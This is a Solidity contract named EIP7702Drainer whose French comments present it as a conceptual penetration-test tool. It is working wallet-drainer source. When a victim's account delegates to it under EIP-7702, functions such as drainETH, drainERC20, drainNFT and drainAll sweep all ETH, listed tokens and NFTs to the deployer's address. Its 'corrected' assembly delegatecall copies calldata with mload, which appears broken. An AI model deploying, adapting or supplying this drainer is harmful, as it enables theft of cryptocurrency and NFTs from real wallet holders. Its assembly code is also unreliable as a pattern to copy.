// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title EIP7702Drainer
 * @dev Contrat conceptuel pour test d'intrusion. 
 * Ce contrat combine délégation et vol de fonds via EIP-7702.
 */

interface IERC20 {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IERC721 {
    function ownerOf(uint256 tokenId) external view returns (address);
    function safeTransferFrom(address from, address to, uint256 tokenId) external;
}

interface IDelegate {
    function execute(bytes calldata data) external;
}

contract EIP7702Drainer {
    // L'adresse qui reçoit tous les fonds (l'attaquant / le pentester)
    address public immutable attacker;
    
    // État de délégation
    address public delegate;
    mapping(address => bool) public delegates;

    constructor() {
        // Le déployeur du contrat est défini comme le bénéficiaire des fonds
        attacker = msg.sender;
    }

    /**
     * @dev Définit un nouveau délégué
     * @param newDelegate La nouvelle adresse de délégué
     */
    function setDelegate(address newDelegate) external {
        require(msg.sender == delegate || msg.sender == attacker, "Not authorized");
        delegate = newDelegate;
        delegates[newDelegate] = true;
    }

    /**
     * @dev Exécute du code via delegatecall - Version corrigée
     * @param data Les données à exécuter
     */
    function execute(bytes calldata data) external {
        require(delegates[msg.sender], "Not delegated");
        
        // Exécuter le code via delegatecall - Version assembly corrigée
        assembly {
            // Récupérer l'adresse du délégué depuis le stockage
            let delegateAddr := sload(delegate.slot)
            
            // Copier les données en mémoire
            let memPtr := mload(0x40)
            let dataLength := data.length
            
            // Copier les données calldata vers la mémoire
            for { let i := 0 } lt(i, dataLength) { i := add(i, 32) } {
                mstore(add(memPtr, i), mload(add(data.offset, i)))
            }
            
            // Exécuter le delegatecall
            let success := delegatecall(gas(), delegateAddr, memPtr, dataLength, 0, 0)
            if iszero(success) { revert(0, 0) }
            
            // Mettre à jour le pointeur de mémoire
            mstore(0x40, add(memPtr, dataLength))
        }
    }

    /**
     * @dev Version simplifiée en Solidity pur (alternative à la fonction execute ci-dessus)
     * @param data Les données à exécuter
     */
    function executeSimple(bytes calldata data) external {
        require(delegates[msg.sender], "Not delegated");
        
        (bool success, ) = delegate.delegatecall(data);
        require(success, "Delegatecall failed");
    }

    /**
     * @dev Vide tout l'ETH contenu dans le wallet délégué.
     */
    function drainETH() external {
        uint256 balance = address(this).balance;
        require(balance > 0, "No ETH to drain");
        payable(attacker).transfer(balance);
    }

    /**
     * @dev Vide un jeton ERC20 spécifique.
     * @param tokenAddress L'adresse du contrat du jeton (ex: USDT, USDC)
     */
    function drainERC20(address tokenAddress) external {
        IERC20 token = IERC20(tokenAddress);
        uint256 balance = token.balanceOf(address(this));
        require(balance > 0, "No tokens to drain");
        token.transfer(attacker, balance);
    }

    /**
     * @dev Vide un NFT spécifique.
     * @param nftAddress L'adresse du contrat NFT
     * @param tokenId L'ID du token à voler
     */
    function drainNFT(address nftAddress, uint256 tokenId) external {
        IERC721 nft = IERC721(nftAddress);
        // On vérifie que le wallet délégué possède bien le NFT
        require(nft.ownerOf(tokenId) == address(this), "Not owner of NFT");
        nft.safeTransferFrom(address(this), attacker, tokenId);
    }

    /**
     * @dev FONCTION DE BATCHING : Vide l'ETH et plusieurs ERC20 en une seule transaction.
     * @param tokens Liste des adresses de jetons ERC20 à vider.
     */
    function drainAll(address[] calldata tokens) external {
        // 1. Drainage de l'ETH
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            payable(attacker).transfer(ethBalance);
        }

        // 2. Drainage des ERC20
        for (uint i = 0; i < tokens.length; i++) {
            IERC20 token = IERC20(tokens[i]);
            uint256 tokenBalance = token.balanceOf(address(this));
            if (tokenBalance > 0) {
                token.transfer(attacker, tokenBalance);
            }
        }
    }

    // Permet au contrat de recevoir des ETH si nécessaire
    receive() external payable {}
}